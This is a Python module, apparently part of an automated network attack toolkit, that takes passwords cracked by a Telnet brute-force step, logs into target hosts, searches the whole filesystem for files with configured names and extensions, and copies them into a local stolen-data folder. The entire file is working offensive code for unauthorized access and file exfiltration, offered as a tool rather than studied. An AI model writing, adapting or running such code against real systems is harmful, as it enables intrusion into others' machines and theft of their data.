"""
steal_files_telnet.py - This script connects to remote Telnet servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import telnetlib
import logging
import time
from rich.console import Console
from threading import Timer
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_telnet.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesTelnet"
b_module = "steal_files_telnet"
b_status = "steal_files_telnet"
b_parent = "TelnetBruteforce"
b_port = 23

class StealFilesTelnet:
    """
    Class to handle the process of stealing files from Telnet servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.telnet_connected = False
            self.stop_execution = False
            logger.info("StealFilesTelnet initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_telnet(self, ip, username, password):
        """
        Establish a Telnet connection.
        """
        try:
            tn = telnetlib.Telnet(ip)
            tn.read_until(b"login: ")
            tn.write(username.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
            tn.read_until(b"$", timeout=10)
            logger.info(f"Connected to {ip} via Telnet with username {username}")
            return tn
        except Exception as e:
            logger.error(f"Telnet connection error for {ip} with user '{username}' & password '{password}': {e}")
            return None

    def find_files(self, tn, dir_path):
        """
        Find files in the remote directory based on the config criteria.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            tn.write(f'find {dir_path} -type f\n'.encode('ascii'))
            files = tn.read_until(b"$", timeout=10).decode('ascii').splitlines()
            matching_files = []
            for file in files:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("File search interrupted due to orchestrator exit.")
                    return []
                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                   any(file_name in file for file_name in self.shared_data.steal_file_names):
                    matching_files.append(file.strip())
            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files on Telnet: {e}")
            return []

    def steal_file(self, tn, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                tn.write(f'cat {remote_file}\n'.encode('ascii'))
                f.write(tn.read_until(b"$", timeout=10))
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from Telnet: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using Telnet.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesTelnet"
                logger.info(f"Stealing files from {ip}:{port}...")
                # Wait a bit because it's too fast to see the status change
                time.sleep(5)
                # Get Telnet credentials from the cracked passwords file
                telnetfile = self.shared_data.telnetfile
                credentials = []
                if os.path.exists(telnetfile):
                    with open(telnetfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def timeout():
                    """
                    Timeout function to stop the execution if no Telnet connection is established.
                    """
                    if not self.telnet_connected:
                        logger.error(f"No Telnet connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.start()

                # Attempt to steal files using each credential
                success = False
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("Steal files execution interrupted due to orchestrator exit.")
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        tn = self.connect_telnet(ip, username, password)
                        if tn:
                            remote_files = self.find_files(tn, '/')
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"telnet/{mac}_{ip}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        logger.info("File stealing process interrupted due to orchestrator exit.")
                                        break
                                    self.steal_file(tn, remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
                            tn.close()
                            if success:
                                timer.cancel()  # Cancel the timer if the operation is successful
                                return 'success'  # Return success if the operation is successful
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with user '{username}': {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_telnet = StealFilesTelnet(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
